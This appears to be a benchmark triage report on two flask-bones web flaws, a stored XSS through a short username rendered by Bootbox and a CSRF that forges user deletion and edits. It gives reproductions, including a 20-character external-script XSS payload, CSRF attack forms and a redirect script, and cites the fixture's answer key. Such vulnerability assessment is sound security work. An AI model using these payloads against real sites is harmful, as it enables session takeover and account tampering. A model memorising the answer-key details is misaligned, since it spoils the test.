### #13 · flask-bones · xss · scored class

**Proposed:** real · new: yes · confidence: medium · reported by 4 configs (CxSec-Luna, CxSec-Sol, CxSec-Terra, Opus5-xhigh)

> Unauthenticated self-registration stores a ≤20-char HTML username. The user list's delete-confirm dialog (jQuery .data → Bootbox .html) executes it in the clicking admin's session.

- **Attacker source:** app/auth/views.py:73 (form field defined at app/user/forms.py:9-10). Unauthenticated POST /register stores username via User.create. The only validator is Length(min=2, max=20), with no character allowlist. The row is stored even if the account is never activated.
- **Sink:** app/static/js/application.js:10, where bootbox.confirm($[el.data](http://el.data)('dialogue'), ...) runs. Bootbox 5.3.2 (package.json, packed.js) renders the message with .find('.bootbox-body').html(e.message).
- **Evidence:** Flask autoescape is on for .html templates, so the username is safely encoded inside the attribute. The decoded attribute value is then read by jQuery .data() and passed to Bootbox. In the bundled bootbox 5.3.2 (packed.js, and the node_modules path in ASSETS_DEBUG mode), the message is inserted with jQuery .html(), so event-handler markup such as the exactly-20-char '<svg onload=alert()>' executes. jQuery .html() also falls back to append() for '<script' strings, so a 20-char '<script src=//[ab.cd](http://ab.cd)>' would load an external script. The route is mounted (user blueprint at /user) and the registration that stores the payload needs no authentication. The victim is any logged-in user, typically the admin, who opens /user/list and clicks the trash icon on the attacker's row. Script then runs in their session, with no CSP present.
- **Novelty:** The flask-bones reference set has no XSS entry (it covers open-redirect, command injection, pickle deserialization, path traversal, mass assignment and IDOR), and none of them uses the username/data-dialogue/Bootbox sink.
- **Second reviewer:** The stored XSS is genuine, but a 20-character payload and a click on the attacker's delete button make 'high confidence' too strong.
- **Strongest counter-argument:** The first pass understates two limits. (1) The username is capped at 20 characters, in the form (forms.py:10) and the column (models.py:11, String(20)). That fits <svg onload=alert()> but no useful inline payload. Real impact needs a 20-character external script include such as <script src=//[ab.cd](http://ab.cd)>. That works only because jQuery 3.4.1's .html() falls back to append() and evaluates the script once bootbox attaches the dialog: plausible, but delicate. (2) It fires only when a victim clicks the delete icon on the attacker's row. Added impact is also small, because any registered user can already delete or edit any user via the IDOR and mass-assignment references. None of this refutes the flow.
- **Your call:** ☐ agree · ☐ disagree → ______



Validated by Grok:

**Exploitable.** A 20-character username runs JavaScript in the victim's browser when they click that row's delete icon. The `<svg onload=alert()>` example does not run in current Chrome.

The app is Flask 1.1.1 on Python 3.11.11, which I built from the official source because the pinned packages do not install on Python 3.12. It uses real PostgreSQL 17.11 on `127.0.0.1:5434` (psycopg2 2.9.9, because 2.8.3 does not compile on 3.11) and the existing Redis 8.0.2 on `127.0.0.1:6379`. Memcached is named in the config, but this code uses an in-process cache, so it was not started. Mail is only queued in Redis; the user row is saved before that queue runs. `GET /` and `GET /register` both returned 200 on `127.0.0.1:5000`.

An unauthenticated `POST /register` stored two usernames. The list page HTML-escapes them inside `data-dialogue`. In Chrome, jQuery's `.data()` returns the decoded string, and Bootbox 5.3.2 inserts it with `.html()`.

| Username | Click result |

|---|---|

| `poc-benign` | Dialog text only. `alert` was not called. |

| `<svg onload=alert()>` (20 characters) | Parsed as a real `<svg onload="alert()">`. `alert` was not called. |

| `<script src=//127.1>` (20 characters) | `alert` ran once. The browser requested `http://127.1/`, which returned `alert()`. |

That script request is the working case. jQuery 3.4.1 does not use `innerHTML` when the string contains `<script`; it appends the markup and loads the external script. The account does not need to be activated. Any logged-in user can open `/user/list` and click the trash icon. There is no existing XSS entry in this fixture's answer key.

The 20-character cap is real. A useful payload has to be a short external script URL, not the SVG handler.

---



### #14 · flask-bones · csrf · CSRF — outside the 14 scored types

**Proposed:** real · new: partial · confidence: medium · reported by 4 configs (CxSec-Luna, CxSec-Sol, CxSec-Terra, Sonnet5-xhigh)

> The shipped config ([serve.py](http://serve.py) → dev_config) disables CSRF, and /user/delete mutates on GET, so a cross-site page can make a logged-in victim delete or edit users or hit the diagnostics endpoints.

- **Attacker source:** A cross-site page controlled by the attacker makes a logged-in victim's browser send requests. One example is a top-level navigation to GET /user/delete/<id>. Another is an auto-submitting POST to /user/edit/<id>, /user/diagnostics or /user/investigate/<id>. These routes are login_required only, and the victim's session cookie is used.
- **Sink:** app/user/views.py:111-115 — GET /user/delete/<id> calls user.delete(). Also app/user/views.py:101-102, where edit's validate_on_submit/populate_obj performs no CSRF check because app/config.py:42 sets WTF_CSRF_ENABLED = False.
- **Evidence:** I confirmed that [serve.py](http://serve.py), the only entrypoint and the one used by docker-compose, builds the app with dev_config, which sets WTF_CSRF_ENABLED=False. No CSRFProtect is initialised anywhere. The routes are mounted under /user and protected only by login_required. Flask 1.1.1 does not set SameSite on the session cookie. Under browser Lax-by-default (Chrome), a top-level GET to /user/delete/<id> still carries the cookie, so forged account deletion works. Cross-site POSTs to edit/diagnostics/investigate work in browsers that do not apply Lax-by-default (Firefox/Safari) or within Chrome's 2-minute Lax+POST window. The incremental impact is modest because the reference IDOR and mass-assignment bugs already let any registered user act directly. CSRF adds an account-less, attribution-shifting route to the same operations.
- **Novelty:** Shares sinks with app-project-flask-bones-idor-user-delete-1 (user.delete at views.py:115) and app-project-flask-bones-mass-assignment-user-edit-1 (populate_obj at views.py:102), and in the Sol variant also with the two command-injection refs. The root cause (CSRF protection disabled, plus state change via GET) and the attacker model (cross-site, no account needed) are different.
- **Second reviewer:** Real: the shipped entrypoint disables CSRF and delete uses GET. Novelty is partial because it reuses the IDOR and mass-assignment sinks.
- **Strongest counter-argument:** Any self-registered user can already perform every forged action directly, through the reference IDOR (views.py:115), mass-assignment (:102) and command-injection routes. CSRF therefore adds anonymity, not capability. It still works against an admin even if those references were fixed, which is why it is a separate flaw. The rubric's 'same sink operation' clause could argue for 'no', but the root cause and the fix both differ, so partial is the fairer label.
- **Your call:** ☐ agree · ☐ disagree → ______



Validated by Grok:

**Exploitable.** A page on `http://127.0.0.2:8101` deleted one account and renamed another by using an admin session on `http://127.0.0.1:5000`. An image request to the same delete URL did nothing.

The app is the Flask Bones process already running from `serve.py`, which loads `dev_config`. `GET /` and `GET /register` both returned 200 on `127.0.0.1:5000`. The database is PostgreSQL 17 on `127.0.0.1:5434`. Redis 8.0.2 is on `127.0.0.1:6379`. Memcached is named in the config, but this code uses an in-process cache, so it was not started. Mail is only queued; these routes do not send it. The Python runtime is 3.11.11. The three disposable accounts were created with `POST /register`. The admin password stays in `/tmp/flaskbones-poc-creds`.

**Source.** The attacker page is on a different site from the app. Chrome treats `127.0.0.2` and `127.0.0.1` as different sites. The routes are login-only: `GET /user/delete/<id>` at `app/user/views.py:111-115`, and `POST /user/edit/<id>` at `app/user/views.py:96-102`. `serve.py` builds the app with `dev_config`, and `app/config.py:42` sets `WTF_CSRF_ENABLED = False`. No `CSRFProtect` is installed. The login response set `session` as `Domain=127.0.0.1; HttpOnly; Path=/`, with no `SameSite` and no `Secure`.

**Sink.** `views.py:115` calls `user.delete()`. `views.py:101-102` runs `validate_on_submit` and `populate_obj` with no CSRF check. Those two operations are already in the answer key as IDOR `views.py:115`) and mass assignment `views.py:102`). CSRF is outside the 14 scored types.

**Control.** With no session cookie, `GET /user/delete/6` and `POST /user/edit/8` both returned **401**, and both rows stayed unchanged. In Chrome 151, after the admin login, this cross-site image also returned **401** and left the row in place:

```html

<img src="[http://127.0.0.1:5000/user/delete/6](http://127.0.0.1:5000/user/delete/6)">

```

A cross-site form POST to `/user/edit/9`, sent 125 seconds after login, returned **401**. That username stayed `csrf-late`.

**Exploit.** Immediately after login, the attacker page submitted this form:

```html

<form method="POST" action="[http://127.0.0.1:5000/user/edit/8](http://127.0.0.1:5000/user/edit/8)">

  <input name="username" value="csrf-forged">

  <input name="email" value="csrf-edit@example.test">

  <input name="active" value="y">

</form>

```

There was no `csrf_token`. The app returned **200**, and the row is now `csrf-forged`. The same browser then ran:

```html

<script>location.href = "[http://127.0.0.1:5000/user/delete/7";</script>](http://127.0.0.1:5000/user/delete/7";</script>)

```

That request returned **302**, and user 7 is gone. The browser landed on `/user/list`.

| Cross-site request from `127.0.0.2` | Result |

|---|---|

| `<img src=".../user/delete/6">` | **401**. `csrf-keep` remains. |

| Top-level `GET /user/delete/7` | **302**. That user is deleted. |

| Top-level `POST /user/edit/8` right after login | **200**. Username becomes `csrf-forged`. |

| Top-level `POST /user/edit/9` after 125 seconds | **401**. `csrf-late` remains. |

That split is Chrome's Lax default. Lax does not attach the cookie to a cross-site image. It does attach it to a cross-site top-level GET, which is enough for the delete. It also attached it to a cross-site top-level POST during the short window after login, and refused that POST once the window had passed. Any registered user can already delete and edit these rows directly, so this adds a way to drive the admin's browser without an attacker account. I would keep it out of `findings-attacker-reachable.json`.